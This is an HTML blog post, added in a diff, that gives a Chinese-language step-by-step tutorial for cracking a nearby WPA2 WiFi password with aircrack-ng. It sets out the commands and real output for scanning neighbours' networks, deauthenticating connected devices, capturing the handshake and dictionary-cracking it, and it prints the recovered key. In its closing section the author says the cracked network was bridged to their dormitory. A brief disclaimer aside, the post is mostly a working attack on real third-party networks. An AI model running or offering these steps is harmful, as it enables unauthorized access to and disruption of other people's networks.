@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2021-04-08 Thu 00:21 -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>利用aircrack-ng暴力破解附近的WiFi实战</title>
+<meta name="generator" content="Org mode">
+<meta name="author" content="Evan Meek">
+<link rel="shortcut icon" href="/images/rose-red.png" type="image/x-icon" />
+<link rel="stylesheet" href="/css/animate.min.css" />
+<link rel="stylesheet" href="/css/all.min.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css" />
+<script src="/js/jquery.min.js"></script>
+<script src="/js/darkreader.js"></script>
+<script src="/js/main.js"></script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">利用aircrack-ng暴力破解附近的WiFi实战</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org5be857a">提前准备</a></li>
+<li><a href="#org8ebd307">安装软件</a>
+<ul>
+<li><a href="#org8b77c21">添加BlackArch软件源</a></li>
+<li><a href="#org6e10a6b">用pacman安装它</a></li>
+<li><a href="#org69b28ce">下载字典</a></li>
+</ul>
+</li>
+<li><a href="#org188de40">具体步骤</a>
+<ul>
+<li><a href="#orgb89a48c">将网卡设置为监听模式</a></li>
+<li><a href="#orgd917738">扫描附近的WiFi</a></li>
+<li><a href="#orga27cf59">利用Airodump-ng抓取包含加密密钥的握手包</a></li>
+<li><a href="#orgdb1bfb9">利用Aireplay-ng加速获取握手包速度</a></li>
+<li><a href="#org20e7d44">利用Aircrak-ng进行暴力破解</a></li>
+<li><a href="#orgc38d95d">关闭网卡监听模式</a></li>
+</ul>
+</li>
+<li><a href="#org24771e1">最后</a></li>
+</ul>
+</div>
+</div>
+<blockquote>
+<p>
+本文章仅作为技术学习交流，请不要随意拿邻居开刀。
+</p>
+</blockquote>
+
+<div id="outline-container-org5be857a" class="outline-2">
+<h2 id="org5be857a">提前准备</h2>
+<div class="outline-text-2" id="text-org5be857a">
+<p>
+你需要如下材料
+</p>
+<ul class="org-ul">
+<li>一个支持监听的无线网卡设备</li>
+<li>一个强大的WiFi字典</li>
+<li>一个有WiFi的地方</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org8ebd307" class="outline-2">
+<h2 id="org8ebd307">安装软件</h2>
+<div class="outline-text-2" id="text-org8ebd307">
+<p>
+你可以在网上找到aircrack-ng的项目地址进行安装或若你是Arch用户仅需要添加BlackArch的软件源，随后通过packman安装即可。
+</p>
+</div>
+<div id="outline-container-org8b77c21" class="outline-3">
+<h3 id="org8b77c21">添加BlackArch软件源</h3>
+<div class="outline-text-3" id="text-org8b77c21">
+<p>
+将这段配置写入到 <code>/etc/pacman.conf</code> 中。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-conf">[<span style="color: #00b8ff;">blackarch</span>]
+<span style="color: #eec900;">SigLevel</span> = Never
+<span style="color: #eec900;">Server</span> = https://mirrors.tuna.tsinghua.edu.cn/blackarch/$repo/os/$arch
+</pre>
+</div>
+
+<p>
+随后刷新软件源:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">pacman -Syy
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org6e10a6b" class="outline-3">
+<h3 id="org6e10a6b">用pacman安装它</h3>
+<div class="outline-text-3" id="text-org6e10a6b">
+<p>
+仅需要一条命令即可安装:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">pacman -S aircrack-ng
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org69b28ce" class="outline-3">
+<h3 id="org69b28ce">下载字典</h3>
+<div class="outline-text-3" id="text-org69b28ce">
+<p>
+由于是通过暴力破解方式破解Wifi密码，所以你需要下载一些强大的字典，字典可以直接在Github上搜索，或者直接google。这里就不提供了。
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-org188de40" class="outline-2">
+<h2 id="org188de40">具体步骤</h2>
+<div class="outline-text-2" id="text-org188de40">
+<p>
+总体分为以下三步:
+</p>
+</div>
+<div id="outline-container-orgb89a48c" class="outline-3">
+<h3 id="orgb89a48c">将网卡设置为监听模式</h3>
+<div class="outline-text-3" id="text-orgb89a48c">
+<p>
+获取你网卡的设备名:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">iwconfig
+</pre>
+</div>
+<p>
+我的电脑获取网卡信息如下:
+</p>
+<div class="org-src-container">
+<pre class="src src-fundamental">lo        no wireless extensions.
+
+wlan0     IEEE 802.11  ESSID:<span style="color: #DFD67A;">"203"</span>  
+          Mode:Managed  Frequency:2.462 GHz  Access Point: 14:75:90:9E:29:8E   
+          Bit Rate=108 Mb/s   Tx-Power=22 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          Link Quality=67/70  Signal level=-43 dBm  
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:2   Missed beacon:0
+</pre>
+</div>
+<p>
+下面列举下有用的网卡信息:
+</p>
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">关键词</th>
+<th scope="col" class="org-left">解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">wlan0</td>
+<td class="org-left">网卡设备名</td>
+</tr>
+
+<tr>
+<td class="org-left">IEEE 802.11</td>
+<td class="org-left">所使用的协议</td>
+</tr>
+
+<tr>
+<td class="org-left">ESSID</td>
+<td class="org-left">当前连接的WiFi</td>
+</tr>
+
+<tr>
+<td class="org-left">Mode</td>
+<td class="org-left">当前网卡的模式</td>
+</tr>
+
+<tr>
+<td class="org-left">Frequency</td>
+<td class="org-left">网卡的频率</td>
+</tr>
+
+<tr>
+<td class="org-left">Link Quality</td>
+<td class="org-left">WiFi连接的质量</td>
+</tr>
+
+<tr>
+<td class="org-left">Signal level</td>
+<td class="org-left">信号强度，越低越好</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+下面需要将网卡设备为监听模式，需要使用 <code>airmon-ng</code> (注意我这里wlan0是我的设备名，你需要替换成你的):
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">sudo airomon-ng start wlan0
+</pre>
+</div>
+
+<p>
+设置完毕后你可以输出一下网卡信息，确保 <code>Mode</code> 为 <code>Monitor</code> 且设备名变成了 <code>wlan0mon</code> ，也就是监听模式。此时你会断网。
+</p>
+</div>
+</div>
+<div id="outline-container-orgd917738" class="outline-3">
+<h3 id="orgd917738">扫描附近的WiFi</h3>
+<div class="outline-text-3" id="text-orgd917738">
+<p>
+开启监听模式的网卡下面可以对附近的WiFi进行扫描了，通过 <code>Airodump-ng</code> 进行扫描附近网络
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">sudo airodump-ng wlan0mon
+</pre>
+</div>
+<p>
+下面是我附近的WiFi状况:
+</p>
+<div class="org-src-container">
+<pre class="src src-fundamental">CH  5 ][ Elapsed: 6 s ][ 2021-04-07 23:34
+BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+B8:F8:83:5E:EF:35   -3        4        1    0   6  405   WPA2 CCMP   PSK  201&#26368;&#24069;                                                                                
+BC:54:FC:62:A1:95   -5        6        0    0   1  270   WPA2 CCMP   PSK  &#38646;                                                                                      
+80:EA:07:36:3D:6F  -12        3        0    0   1  270   WPA2 CCMP   PSK  &#22768;&#24494;&#39277;&#21542;                                                                             
+64:64:4A:27:74:37  -14        4        8    0   1  130   WPA2 CCMP   PSK  &lt;length:  0&gt;                                                                             
+4A:7D:2E:03:04:DF  -30        5        0    0  11  270   WPA2 CCMP   PSK  hackers                                                                                  
+14:75:90:9E:29:8E  -35        2        0    0  11  270   WPA2 CCMP   PSK  203                                                                                      
+F0:B4:29:86:BB:8F  -71        0        6    2   1   -1   WPA              &lt;length:  0&gt;                                                                             
+DA:42:10:A9:9D:C8  -71        0        0    0  -1   -1                    &lt;length:  0&gt;                                                                             
+B0:95:8E:47:A9:87  -126        3        0    0   6  405   WPA2 CCMP   PSK  cui-wifi                                                                                
+
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+</pre>
+</div>
+<p>
+这里我们将会对 <code>203</code> 这个WiFi进行攻击，所以我们需要记录下对应的 <code>BSSID</code> 以及 <code>CH</code> ，这两个值分别是WiFi唯一标识和信道。
+建议选择 <code>PWR</code> 较小的WiFi，因为这意味着信号较好。
+</p>
+</div>
+</div>
+<div id="outline-container-orga27cf59" class="outline-3">
+<h3 id="orga27cf59">利用Airodump-ng抓取包含加密密钥的握手包</h3>
+<div class="outline-text-3" id="text-orga27cf59">
+<p>
+随后我们再次使用Airodump-ng尝试抓取包含密钥的握手包:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">sudo airodump-ng wlan0mon -c 11 --bssid 14:75:90:9E:29:8E
+</pre>
+</div>
+
+<p>
+其中的 <code>-c</code> 参数代表了信道号， <code>--bssid</code> 代表此WiFi的唯一标识。
+</p>
+
+<p>
+执行后等待一会，输出结果如下:
+</p>
+<div class="org-src-container">
+<pre class="src src-fundamental">CH 11 ][ Elapsed: 6 s ][ 2021-04-07 23:41
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 14:75:90:9E:29:8E  -37   1       89     4294  299  11  270   WPA2 CCMP   PSK  203
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 14:75:90:9E:29:8E  48:7D:2E:B3:04:DF  -29    0 - 1e     0        7
+ 14:75:90:9E:29:8E  E0:DC:FF:DC:5A:89  -40    0 - 0e   817     4259
+ 14:75:90:9E:29:8E  80:ED:2C:10:0D:8A  -63    0 -24      0        2
+ 14:75:90:9E:29:8E  FA:83:C4:C0:8F:DF  -60    0e-24     88       88
+</pre>
+</div>
+<p>
+从这个输出结果我们可以分析到的数据：
+</p>
+<ul class="org-ul">
+<li>当前连接此WiFi的设备有4台，以及每台设备的唯一标识，发包数等。
+下面的四行也就代表了四台设备，我们需要记录 <code>Lost</code> 有变化的设备标识，这里我们选择标识为 <code>E0:DC:FF:DC:5A:89</code> 的设备。</li>
+</ul>
+
+<p>
+好的，目前我们掌握了几条有用的信息，如下:
+</p>
+<dl class="org-dl">
+<dt>WiFi唯一标识</dt><dd>14:75:90:9E:29:8E</dd>
+<dt>连接WiFi的设备之一的标识</dt><dd>E0:DC:FF:DC:5A:89</dd>
+<dt>WiFi的信道</dt><dd>11</dd>
+</dl>
+
+<p>
+下面我们需要根据以上信息进行抓包，尝试拿到包含密钥的握手包。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">sudo airodump-ng wlan0mon --bssid 14:75:90:9E:29:8E -c 11 -w 203
+</pre>
+</div>
+
+<p>
+注意，这里的 <code>-w</code> 是指将抓到的数据文件的前缀名，所以我建议你最好创建一个目录并在此目录下执行命令。
+</p>
+
+<p>
+随后我们只需要一直运行这条命令即可，不要关闭它。
+</p>
+</div>
+</div>
+<div id="outline-container-orgdb1bfb9" class="outline-3">
+<h3 id="orgdb1bfb9">利用Aireplay-ng加速获取握手包速度</h3>
+<div class="outline-text-3" id="text-orgdb1bfb9">
+<p>
+下面我们需要利用 <code>Aireplay-ng</code> 进行断网攻击，当用户重连WiFi时 <code>Airodump-ng</code> 应该就能拿到密钥的数据包了。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">sudo aireplay-ng wlan0mon -0 10 -a 14:75:90:9E:29:8E -c E0:DC:FF:DC:5A:89 
+</pre>
+</div>
+<p>
+这里的 <code>-0</code> 代表攻击次数，后面的10也就是攻击次数、 <code>-a</code> 代表要攻击的WiFi、 <code>-c</code> 代表要攻击的已连接WiFi的设备。
+</p>
+
+<p>
+此命令的输出结果如下:
+</p>
+<div class="org-src-container">
+<pre class="src src-fundamental">23:55:26  Waiting for beacon frame (BSSID: 14:75:90:9E:29:8E) on channel 11
+23:55:28  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [27| 1 ACKs]
+23:55:29  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 3| 1 ACKs]
+23:55:30  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 2| 6 ACKs]
+23:55:32  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 8| 7 ACKs]
+23:55:34  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 7| 7 ACKs]
+23:55:36  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 7|14 ACKs]
+23:55:39  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [34| 3 ACKs]
+23:55:41  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [22| 6 ACKs]
+23:55:43  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 5| 5 ACKs]
+23:55:45  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [10| 6 ACKs]
+</pre>
+</div>
+
+<p>
+如果这种方式多次失败，可以尝试去掉 <code>-c</code> 参数，进行范围打击，对每个设备都进行攻击，这样拿到加密包的机率也会有提升。
+</p>
+
+
+<p>
+当 <code>airodump-ng</code> 那边提示拿到 <code>WPA handshake</code> 即代表拿到加密握手包，也就不需要断网攻击了。
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">CH 11 ][ Elapsed: 6 mins ][ 2021-04-08 00:05 ][ WPA handshake: 14:75:90:9E:29:8E
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org20e7d44" class="outline-3">
+<h3 id="org20e7d44">利用Aircrak-ng进行暴力破解</h3>
+<div class="outline-text-3" id="text-org20e7d44">
+<p>
+下面我们通过准备的字典以及拿到的握手包进行暴力破解。
+</p>
+
+<p>
+首先看看我们拿到了哪些数据包:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell"><span style="color: #00b8ff;">cd</span> ~/hack/wifi/demo/203 &amp;&amp; <span style="color: #00b8ff;">pwd</span> &amp;&amp; ls -l
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-fundamental">/home/evanmeek/hack/wifi/demo/203
+total 520
+-rw-r--r-- 1 root root 461174 Apr  8 00:07 203-01.cap
+-rw-r--r-- 1 root root    960 Apr  8 00:07 203-01.csv
+-rw-r--r-- 1 root root    590 Apr  8 00:07 203-01.kismet.csv
+-rw-r--r-- 1 root root   8192 Apr  8 00:07 203-01.kismet.netxml
+-rw-r--r-- 1 root root  51262 Apr  8 00:07 203-01.log.csv
+</pre>
+</div>
+
+<p>
+包含密钥握手包的文件是 <code>203-01.cap</code> 我们需要使用它。
+</p>
+
+<p>
+执行如下命令进行破解
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">sudo aircrack-ng 203-01.cap -w ~/hack/wifi/dict/Big_dictionary/english.txt
+</pre>
+</div>
+
+<p>
+<code>-w</code> 是我们的字典， <code>203-01.cap</code> 是我们拿到的密钥握手包。
+</p>
+
+<p>
+过了一会，我这个字典刚好包含这个WiFi的密码，仅花了6秒就破解成功。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-fundamental">                         Aircrack-ng 1.6
+
+[00:00:06] 97400/672047 keys tested (15447.93 k/s)
+
+Time left: 37 seconds                                     14.49%
+
+                     KEY FOUND! [ 40154015 ]
+
+
+Master Key     : D6 16 29 7C 14 8C 73 B6 9F 13 C7 0F F6 84 82 CD
+                 DE 7E 6A A4 CF 80 02 09 FA 26 A5 F8 D4 80 CF D8
+
+Transient Key  : A8 09 92 3A C5 03 12 10 94 22 1A A2 D8 6D 34 8C
+                 F6 2A 6D 45 35 64 A8 63 A0 4E 67 00 00 00 00 00
+                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+EAPOL HMAC     : 13 2A 3B F7 65 0D 59 34 04 60 35 00 FD EC F1 CA
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgc38d95d" class="outline-3">
+<h3 id="orgc38d95d">关闭网卡监听模式</h3>
+<div class="outline-text-3" id="text-orgc38d95d">
+<p>
+破解完成后，我们需要将网卡的模式设置为 <code>Managed</code> 。
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">sudo airmon-ng stop wlan0mon
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org24771e1" class="outline-2">
+<h2 id="org24771e1">最后</h2>
+<div class="outline-text-2" id="text-org24771e1">
+<p>
+随后我利用Wifi信号放大，桥接器，将此WiFi桥接到我们宿舍，并将名字改为 <code>hacker</code> 。
+</p>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="date">Date: 2021-04-07 Wed 00:00</p>
+<p class="author">Author: Evan Meek</p>
+<p class="date">Created: 2021-04-08 Thu 00:21</p>
+<p class="validation"><a href="https://validator.w3.org/check?uri=referer">Validate</a></p>
+</div>
+</body>
+</html>
